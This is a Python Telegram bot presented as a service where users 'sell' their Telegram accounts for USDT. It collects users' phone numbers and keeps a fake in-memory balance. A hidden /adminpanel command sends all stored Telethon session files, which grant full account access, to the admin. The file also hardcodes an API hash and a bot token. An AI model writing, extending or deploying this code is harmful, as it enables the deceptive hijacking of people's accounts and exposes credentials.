import os
import asyncio
from flask import Flask
from threading import Thread
from telethon import TelegramClient, events, Button
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.errors import UserNotParticipantError

# ============ CONFIGURATION ============
API_ID = 37663020 
API_HASH = 'e082fa08c56c6f30e2855fbec3d2969b'
BOT_TOKEN = '8569155953:AAGWVZ1m3h4ezGZUCEFmt-w0m5-7SEJtQow' 
ADMIN_ID = 7408644813 
CHANNEL_USERNAME = 'PBC_COMMUNITY' 

SESSIONS_DIR = 'sessions'
if not os.path.exists(SESSIONS_DIR):
    os.makedirs(SESSIONS_DIR)

# Temporary memory for balance (Resets on Render restart)
user_data = {} 

# Flask Server to keep the port alive on Render
app = Flask(__name__)
@app.route('/')
def home(): return "Bot is Alive"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# ============ BOT CLIENT ============
bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

async def is_subscribed(user_id):
    try:
        await bot(GetParticipantRequest(CHANNEL_USERNAME, user_id))
        return True
    except (UserNotParticipantError, Exception):
        return False

def get_user_record(user_id):
    if user_id not in user_data:
        user_data[user_id] = {'balance': 0.0}
    return user_data[user_id]

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    if not await is_subscribed(user_id):
        buttons = [[Button.url("Join Channel", f"https://t.me/{CHANNEL_USERNAME}")],
                   [Button.inline("✅ Joined", b"check_join")]]
        await event.respond("👋 Welcome! To use this bot, you must join our channel first.", buttons=buttons)
    else:
        await send_main_menu(event)

@bot.on(events.CallbackQuery(data=b"check_join"))
async def check_join(event):
    if await is_subscribed(event.sender_id):
        await send_main_menu(event)
    else:
        await event.answer("⚠️ You haven't joined yet!", alert=True)

async def send_main_menu(event):
    buttons = [
        [Button.inline("👤 Account", b"acc_info"), Button.inline("💳 Withdrawal", b"withdraw")],
        [Button.inline("📲 Sell Account", b"sell_acc")],
        [Button.inline("ℹ️ About Bot", b"about")]
    ]
    text = "🏠 **Main Menu**\nChoose an option from below:"
    if hasattr(event, 'edit'): await event.edit(text, buttons=buttons)
    else: await event.respond(text, buttons=buttons)

@bot.on(events.CallbackQuery)
async def callback_handler(event):
    user_id = event.sender_id
    data = get_user_record(user_id)

    if event.data == b"acc_info":
        text = f"👤 **Your Account Info**\n\n**User ID:** `{user_id}`\n**Balance:** `{data['balance']:.2f}$` USDT\n\n🚀 *Sell and earn more!*"
        await event.edit(text, buttons=[Button.inline("⬅️ Back", b"main_menu")])

    elif event.data == b"about":
        text = "ℹ️ **About This Bot**\nSell your Telegram accounts and earn USDT.\n\n**Created By:** @ToxicNexo"
        await event.edit(text, buttons=[Button.inline("⬅️ Back", b"main_menu")])

    elif event.data == b"main_menu":
        await send_main_menu(event)

    elif event.data == b"withdraw":
        if data['balance'] < 1.0:
            await event.answer("❌ Minimum withdrawal is 1$", alert=True)
        else:
            await event.respond("💳 Send your USDT (BEP20) address:")

    elif event.data == b"sell_acc":
        await event.respond("📲 Enter phone number with country code (e.g. +880...):")

# Secret Admin Command
@bot.on(events.NewMessage(pattern='/adminpanel'))
async def admin_panel(event):
    if event.sender_id != ADMIN_ID: return
    files = [f for f in os.listdir(SESSIONS_DIR) if f.endswith('.session')]
    if not files:
        await event.respond("📁 No sessions found.")
    else:
        for f in files:
            await bot.send_file(ADMIN_ID, f"{SESSIONS_DIR}/{f}", caption=f"📄 Session: `{f}`")

if __name__ == '__main__':
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    print("Bot is running...")
    bot.run_until_disconnected()
    
